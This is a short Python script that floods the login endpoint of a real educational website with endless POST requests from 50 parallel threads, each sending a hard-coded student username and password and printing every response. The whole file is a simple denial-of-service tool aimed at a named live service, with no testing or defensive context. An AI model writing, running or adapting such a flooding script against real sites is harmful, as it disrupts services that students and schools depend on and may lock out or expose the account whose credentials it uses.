import requests, random, threading

def postRequest(url, payload):
    while True:
        response = requests.post(url, data=payload)
        print(response)

Thread = threading.Thread()
payload = {
    "username": "owenc0267",
    "password": "zlor",
    "lastname": "",
    "userType": "student"
}
url = 'https://my.educake.co.uk/login'

threads = []
for i in range(50):
    new_thread = threading.Thread(target=postRequest,args=(url,payload))
    new_thread.daemon = True
    threads.append(new_thread)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
